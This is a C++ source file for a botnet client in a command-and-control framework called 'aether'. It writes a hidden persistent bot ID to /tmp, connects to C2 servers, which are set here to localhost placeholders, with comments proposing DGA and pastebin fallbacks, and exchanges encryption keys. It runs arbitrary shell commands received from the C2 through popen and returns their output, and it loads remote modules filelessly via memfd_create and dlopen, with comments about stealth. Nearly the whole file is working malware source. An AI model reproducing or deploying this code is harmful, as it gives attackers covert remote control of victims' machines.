#include "bot_client.hpp"
#include <iostream>
#include <thread>
#include <chrono>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <openssl/bio.h>
#include <openssl/err.h>
#include <openssl/rand.h>
#include <cstdio>
#include <fstream>
#include <sys/utsname.h>
#include <dlfcn.h>
#include <random>
#include <algorithm>
#include <sys/mman.h>
#include <sstream>
#include <sys/syscall.h>
#include <fcntl.h>

// Bot Identity Management
const std::string BOT_ID_PATH = "/tmp/.bot_id";

std::string random_string(size_t length) {
    auto randchar = []() -> char {
        const char charset[] = "0123456789abcdefghijklmnopqrstuvwxyz";
        const size_t max_index = (sizeof(charset) - 2);
        return charset[rand() % max_index];
    };
    std::string str(length, 0);
    std::generate_n(str.begin(), length, randchar);
    return str;
}

std::string get_persistent_id() {
    std::ifstream id_file(BOT_ID_PATH);
    if (id_file.is_open()) {
        std::string id;
        std::getline(id_file, id);
        id_file.close();
        if (!id.empty()) return id;
    }
    
    std::string new_id = random_string(16);
    std::ofstream outfile(BOT_ID_PATH);
    if (outfile.is_open()) {
        outfile << new_id;
        outfile.close();
    }
    return new_id;
}

// BotClient Implementation
BotClient::BotClient() : sock_(-1), rsa_pub_key_(nullptr), c2_cert_(nullptr), current_c2_index_(0) {
    srand(time(NULL) ^ getpid());
    memset(aes_key_, 0, sizeof(aes_key_));
    initialize_config();
    
    // Initialize OpenSSL
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();
}

BotClient::~BotClient() {
    cleanup_resources();
}

void BotClient::cleanup_resources() {
    if (sock_ != -1) {
        close(sock_);
        sock_ = -1;
    }
    
    if (rsa_pub_key_) {
        RSA_free(rsa_pub_key_);
        rsa_pub_key_ = nullptr;
    }
    
    if (c2_cert_) {
        X509_free(c2_cert_);
        c2_cert_ = nullptr;
    }
    
    // Cleanup loaded modules
    for (auto const& [name, module] : modules_) {
        if (module.cleanup) {
            try {
                module.cleanup();
            } catch (...) {
                // Ignore cleanup errors
            }
        }
        if (module.handle) dlclose(module.handle);
        if (module.mem_fd != -1) close(module.mem_fd);
    }
    modules_.clear();
}

void BotClient::initialize_config() {
    // Primary C2 endpoints - in real deployment these would be hardcoded or DGA
    c2_endpoints_.push_back({"127.0.0.1", 4444});
    c2_endpoints_.push_back({"127.0.0.1", 4445});
    
    // Additional fallback methods could include:
    // - Domain generation algorithms (DGA)
    // - DNS TXT record lookups
    // - Social media/pastebin scraping
    // - Peer-to-peer discovery
}

C2Endpoint BotClient::get_next_c2_endpoint() {
    if (c2_endpoints_.empty()) {
        // Fallback endpoint
        return {"127.0.0.1", 4444};
    }
    
    C2Endpoint endpoint = c2_endpoints_[current_c2_index_];
    current_c2_index_ = (current_c2_index_ + 1) % c2_endpoints_.size();
    return endpoint;
}

void BotClient::log_internal(const std::string& message, bool report_to_c2) {
    // In production, this would write to an encrypted log file
    // For stealth, we avoid writing to disk unless necessary
    if (report_to_c2 && sock_ != -1) {
        try {
            std::vector<char> data = aether::serialize_string("[LOG] " + message);
            send_message(aether::MSG_C2S_TASK_OUTPUT, data);
        } catch (...) {
            // Silently ignore logging errors
        }
    }
}

void BotClient::start() {
    log_internal("Bot starting up", false);
    
    int reconnect_attempts = 0;
    const int max_attempts = 5;
    int base_delay = 10; // seconds
    
    while (true) {
        try {
            if (connect_to_c2()) {
                reconnect_attempts = 0; // Reset on successful connection
                if (perform_handshake()) {
                    log_internal("Connected to C2", false);
                    main_loop();
                }
            }
        } catch (const std::exception& e) {
            log_internal("Connection error: " + std::string(e.what()), false);
        }
        
        // Exponential backoff with jitter
        reconnect_attempts++;
        int delay = std::min(base_delay * (1 << std::min(reconnect_attempts, 6)), 3600); // Max 1 hour
        delay += rand() % 30; // Add jitter
        
        log_internal("Reconnecting in " + std::to_string(delay) + "s (attempt " + 
                    std::to_string(reconnect_attempts) + ")", false);
        
        std::this_thread::sleep_for(std::chrono::seconds(delay));
    }
}

bool BotClient::connect_to_c2() {
    if (sock_ != -1) {
        close(sock_);
        sock_ = -1;
    }
    
    sock_ = socket(AF_INET, SOCK_STREAM, 0);
    if (sock_ == -1) return false;
    
    // Set socket timeout
    struct timeval timeout;
    timeout.tv_sec = 30;
    timeout.tv_usec = 0;
    setsockopt(sock_, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock_, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    C2Endpoint endpoint = get_next_c2_endpoint();
    sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(endpoint.port);
    
    if (inet_pton(AF_INET, endpoint.host.c_str(), &serv_addr.sin_addr) <= 0) {
        close(sock_);
        sock_ = -1;
        return false;
    }
    
    if (connect(sock_, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        close(sock_);
        sock_ = -1;
        return false;
    }
    
    return true;
}

bool BotClient::perform_handshake() {
    try {
        // 1. Receive C2's public key and certificate
        char buffer[8192];
        int bytes_read = recv(sock_, buffer, sizeof(buffer) - 1, 0);
        if (bytes_read <= 0) return false;
        buffer[bytes_read] = '\0';

        BIO* bio = BIO_new_mem_buf(buffer, -1);
        if (!bio) return false;
        
        // Read public key
        rsa_pub_key_ = PEM_read_bio_RSA_PUBKEY(bio, NULL, NULL, NULL);
        if (!rsa_pub_key_) {
            // Try alternative format
            BIO_reset(bio);
            rsa_pub_key_ = PEM_read_bio_RSAPublicKey(bio, NULL, NULL, NULL);
        }
        
        // Read certificate
        c2_cert_ = PEM_read_bio_X509(bio, NULL, NULL, NULL);
        BIO_free(bio);
        
        if (!rsa_pub_key_ || !c2_cert_) {
            log_internal("Handshake failed: Invalid key or certificate from C2.", false);
            return false;
        }

        // 2. Generate and send AES key
        if (!RAND_bytes(aes_key_, sizeof(aes_key_))) return false;
        
        unsigned char encrypted_key[RSA_size(rsa_pub_key_)];
        int encrypted_length = RSA_public_encrypt(sizeof(aes_key_), aes_key_, 
                                                encrypted_key, rsa_pub_key_, 
                                                RSA_PKCS1_OAEP_PADDING);
        if (encrypted_length == -1) return false;
        
        if (send(sock_, encrypted_key, encrypted_length, 0) < 0) return false;

        // 3. Send persistent ID
        std::string bot_id = get_persistent_id();
        send_message(aether::MSG_C2S_REGISTER, aether::serialize_string(bot_id));

        // 4. Wait for registration acknowledgment
        aether::Header ack_header;
        if (recv(sock_, &ack_header, sizeof(ack_header), 0) <= 0) return false;
        
        if (ack_header.type != aether::MSG_S2C_REG_ACK) return false;

        log_internal("Handshake successful. ID: " + bot_id, false);
        return true;
        
    } catch (const std::exception& e) {
        log_internal("Handshake exception: " + std::string(e.what()), false);
        return false;
    }
}

void BotClient::main_loop() {
    // Send initial heartbeat
    send_message(aether::MSG_C2S_HEARTBEAT, aether::serialize_string(get_os_info()));
    
    auto last_heartbeat = std::chrono::steady_clock::now();
    const auto heartbeat_interval = std::chrono::seconds(60);

    while (true) {
        // Check if it's time for a heartbeat
        auto now = std::chrono::steady_clock::now();
        if (now - last_heartbeat >= heartbeat_interval) {
            send_message(aether::MSG_C2S_HEARTBEAT, aether::serialize_string(get_os_info()));
            last_heartbeat = now;
        }
        
        // Check for incoming messages (non-blocking with short timeout)
        fd_set read_fds;
        FD_ZERO(&read_fds);
        FD_SET(sock_, &read_fds);
        
        struct timeval timeout;
        timeout.tv_sec = 1;
        timeout.tv_usec = 0;
        
        int activity = select(sock_ + 1, &read_fds, NULL, NULL, &timeout);
        if (activity < 0) break; // Error
        if (activity == 0) continue; // Timeout, continue loop
        
        // Data available to read
        aether::Header header;
        int n = recv(sock_, &header, sizeof(header), 0);
        if (n <= 0) break;

        if (header.length < sizeof(header) || header.length > 1024*1024) {
            log_internal("Invalid message length: " + std::to_string(header.length), true);
            break;
        }

        std::vector<char> encrypted_data(header.length - sizeof(header));
        n = recv(sock_, encrypted_data.data(), encrypted_data.size(), 0);
        if (n <= 0) break;

        try {
            handle_task(header, encrypted_data);
        } catch (const std::exception& e) {
            log_internal("Task handling error: " + std::string(e.what()), true);
        }
    }
}

void BotClient::send_message(uint8_t type, const std::vector<char>& data) {
    try {
        std::vector<char> encrypted_payload = aether::encrypt_and_sign(data, aes_key_);
        if (encrypted_payload.empty()) {
            log_internal("Encryption failed", false);
            return;
        }
        
        aether::Header header;
        header.type = type;
        header.length = sizeof(header) + encrypted_payload.size();

        if (send(sock_, &header, sizeof(header), 0) < 0) {
            throw std::runtime_error("Failed to send header");
        }
        
        if (send(sock_, encrypted_payload.data(), encrypted_payload.size(), 0) < 0) {
            throw std::runtime_error("Failed to send payload");
        }
    } catch (const std::exception& e) {
        log_internal("Send message error: " + std::string(e.what()), false);
        throw;
    }
}

void BotClient::handle_task(const aether::Header& header, const std::vector<char>& encrypted_data) {
    std::vector<char> decrypted_data = aether::verify_and_decrypt(encrypted_data, aes_key_);
    if (decrypted_data.empty()) {
        log_internal("HMAC verification failed for incoming task.", true);
        return;
    }

    switch (header.type) {
        case aether::MSG_S2C_LOAD_MODULE:
            load_module(decrypted_data);
            break;
        case aether::MSG_S2C_NEW_TASK:
            execute_task(decrypted_data);
            break;
        default:
            log_internal("Unknown task type: " + std::to_string(header.type), true);
            break;
    }
}

void BotClient::execute_task(const std::vector<char>& data) {
    std::string task_data = aether::deserialize_string(data);
    log_internal("Executing task: " + task_data, true);
    
    // Basic command execution
    std::string command = task_data;
    std::string output;
    
    FILE* pipe = popen(command.c_str(), "r");
    if (pipe) {
        char buffer[1024];
        while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
            output += buffer;
        }
        pclose(pipe);
    } else {
        output = "Failed to execute command";
    }
    
    send_message(aether::MSG_C2S_TASK_OUTPUT, aether::serialize_string(output));
}

std::string BotClient::get_os_info() {
    struct utsname buf;
    if (uname(&buf) == 0) {
        return std::string(buf.sysname) + " " + std::string(buf.release) + 
               " " + std::string(buf.machine);
    }
    return "Unknown OS";
}

void BotClient::load_module(const std::vector<char>& data) {
    try {
        // Data format: [module_name (null-terminated)] [signature] [module.so]
        if (data.size() < 257) { // minimum: 1 char name + null + 256 sig
            log_internal("Invalid module data size", true);
            return;
        }
        
        std::string module_name(data.data());
        if (module_name.empty() || module_name.length() >= data.size()) {
            log_internal("Invalid module name", true);
            return;
        }
        
        const unsigned char* signature = (const unsigned char*)data.data() + module_name.length() + 1;
        const char* module_so_data = (const char*)signature + 256; // 256 is RSA signature size
        size_t module_so_size = data.size() - (module_name.length() + 1) - 256;
        
        if (module_so_size == 0) {
            log_internal("Empty module data", true);
            return;
        }

        // 1. Verify Signature
        EVP_PKEY* pubkey = X509_get_pubkey(c2_cert_);
        if (!pubkey) {
            log_internal("Failed to extract public key from certificate", true);
            return;
        }
        
        EVP_MD_CTX* md_ctx = EVP_MD_CTX_new();
        if (!md_ctx) {
            EVP_PKEY_free(pubkey);
            return;
        }
        
        int verify_result = 0;
        if (EVP_DigestVerifyInit(md_ctx, NULL, EVP_sha256(), NULL, pubkey) == 1) {
            if (EVP_DigestVerifyUpdate(md_ctx, module_so_data, module_so_size) == 1) {
                verify_result = EVP_DigestVerifyFinal(md_ctx, signature, 256);
            }
        }
        
        EVP_MD_CTX_free(md_ctx);
        EVP_PKEY_free(pubkey);

        if (verify_result != 1) {
            log_internal("Module signature verification failed for: " + module_name, true);
            return;
        }

        // 2. In-memory load using memfd_create
        int fd = syscall(SYS_memfd_create, module_name.c_str(), MFD_CLOEXEC);
        if (fd == -1) {
            log_internal("memfd_create failed for: " + module_name, true);
            return;
        }
        
        if (write(fd, module_so_data, module_so_size) != (ssize_t)module_so_size) {
            close(fd);
            log_internal("Failed to write module to memory fd: " + module_name, true);
            return;
        }
        
        std::string fd_path = "/proc/self/fd/" + std::to_string(fd);
        void* handle = dlopen(fd_path.c_str(), RTLD_LAZY);
        if (!handle) {
            close(fd);
            log_internal("dlopen failed for: " + module_name + " - " + dlerror(), true);
            return;
        }

        // 3. Load function pointers
        Module module;
        module.handle = handle;
        module.mem_fd = fd;
        module.init = (module_init_t)dlsym(handle, "init");
        module.run = (module_run_t)dlsym(handle, "run");
        module.cleanup = (module_cleanup_t)dlsym(handle, "cleanup");

        if (!module.run) {
            dlclose(handle);
            close(fd);
            log_internal("Module missing run function: " + module_name, true);
            return;
        }

        // 4. Initialize module
        if (module.init) {
            try {
                module.init();
            } catch (const std::exception& e) {
                dlclose(handle);
                close(fd);
                log_internal("Module init failed: " + module_name + " - " + e.what(), true);
                return;
            }
        }

        // 5. Store module
        modules_[module_name] = module;
        log_internal("Module loaded successfully: " + module_name, true);
        
    } catch (const std::exception& e) {
        log_internal("Module loading exception: " + std::string(e.what()), true);
    }
}

void BotClient::unload_module(const std::string& module_name) {
    auto it = modules_.find(module_name);
    if (it == modules_.end()) {
        log_internal("Module not found for unload: " + module_name, true);
        return;
    }

    Module& module = it->second;
    
    if (module.cleanup) {
        try {
            module.cleanup();
        } catch (const std::exception& e) {
            log_internal("Module cleanup error: " + module_name + " - " + e.what(), true);
        }
    }
    
    dlclose(module.handle);
    close(module.mem_fd);
    modules_.erase(it);
    
    log_internal("Module unloaded: " + module_name, true);
}

void BotClient::run_module(const std::string& module_name, const std::vector<char>& data) {
    auto it = modules_.find(module_name);
    if (it == modules_.end()) {
        log_internal("Module not found: " + module_name, true);
        return;
    }

    Module& module = it->second;
    if (!module.run) {
        log_internal("Module has no run function: " + module_name, true);
        return;
    }

    try {
        // Create callback for module to send output back to C2
        auto send_output = [this](const std::vector<char>& output) {
            this->send_message(aether::MSG_C2S_TASK_OUTPUT, output);
        };
        
        module.run(data, send_output);
        log_internal("Module executed: " + module_name, true);
    } catch (const std::exception& e) {
        log_internal("Module execution error: " + module_name + " - " + e.what(), true);
    }
}
